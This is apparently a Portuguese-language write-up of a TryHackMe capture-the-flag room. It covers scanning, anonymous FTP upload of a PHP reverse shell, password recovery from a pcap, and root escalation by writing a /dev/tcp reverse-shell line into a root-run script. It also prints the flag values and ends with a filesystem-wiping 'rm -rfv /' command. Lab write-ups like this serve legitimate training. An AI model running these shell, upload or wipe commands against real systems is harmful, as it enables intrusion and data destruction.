CTF STARTIUP 

Ao gerar o ip dei um nmap para ver as portas abertas

    nmap -A -sV IP

Encontrava-se 3 portas(ftp 21, tcp 22, tcp 80)

sendo o ftp anonymous era so entrar...

    ftp ip
    username: anonymous
    pass: no pass

3 arquivos

    ftp
    notice.txt
    important.jpg

Ao ler o notice.txt encontrava-se um possivel username Maya

Ao baixar a imagem e abri-la tinha um meme do among us...

    get important.jpg

Ao dar um gobuster para encontravar diretorios

    gobuster dir -u IP -w directory-list-2.3-small.txt -x php,html,txt

encontrava o /files que resultava no mesmo arquivo do ftp...

assim era so pegar um webshell, usei o do pentestmokey 

    https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Criei um arquivo no kali chamado shellphp.php 

    nano shellphp.php

Modifiquei o ip e a porta que e solicitado no codigo

e coloquei na pasta ftp

    put shellphp.php

Assim eu fiz o netcat

    nc -nvlp 1333

Ao abrir o IP/files/ftp cliquei para rodar esse codigo assim conseguindo acesso ao www-data

Conseguindo acesso a 1 flag do desafio "recipe.txt"

    cat recipe.txt

    Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
    
Procurando pelo sistema encontrei uma pasta chamado incidents ao dar um cd nessa pasta tinha um arquivo chamado

    suspicious.pcapng

Ao baixa-lo

    get suspicious.pcapng /var/www/html/files/ftp

Abrindo esse arquivo automaticamente abria o Wireshark um aplicativo de analise de rede

Olhando no Wireshark notei que ele mostrava alguns diretorios root, selecionei a opcao follow tcp e la dentro tenha uma requisicao da senha do www-data

    senha www-data c4ntg3t3n0ughsp1c3

Sendo essa a senha do www-data e como dentro do /home tinha um usuario chamado lennie era so fazer a conexao ssh com o user lennie

    ssh lennie@IP
    pass: c4ntg3t3n0ughsp1c3

Assim sendo possivel acessar a 2 flag "user.txt"

    cat user.txt
    THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

Ainda no usuario lennie tinha uma pasta chamada scripts ao abrir tinha um aquivo .sh

    planner.sh

O "planner.sh" executava um arquivo root dentro dele e tinha sua rota

    /etc/print.sh

Esse arquivo executava como root, sendo assim era so pegar uma reverse shell para conseguir ter acesso 

    https://www.revshells.com/

assim criando uma shell sh e modificando o arquivo "print.sh" com esse script

Script

    sh -i >& /dev/tcp/IPTRYHACKME/1333 0>&1

NetCat

    nc -nvlp 1333

Assim tendo acesso a pasta root que tinha o arquivo "root.txt"

    cat root.txt
    THM{f963aaa6a430f210222158ae15c3d76d}

Assim finalizando o desafio..

    touch dannydev19.txt
    rm -rfv / --no-preserve-root

FLAGS

    Flag 1: love
    Flag 2: THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
    Flag 3: THM{f963aaa6a430f210222158ae15c3d76d}

![image](https://user-images.githubusercontent.com/86691253/183748747-f4abcbe4-48b4-4b4f-b198-b87965cb371e.png)
![image](https://user-images.githubusercontent.com/86691253/183748759-793db94e-3539-4cce-a34f-f7f24a30c2cd.png)
![image](https://user-images.githubusercontent.com/86691253/183748774-6a6245d1-c26f-4fec-bbbc-8d2a9920e6cb.png)
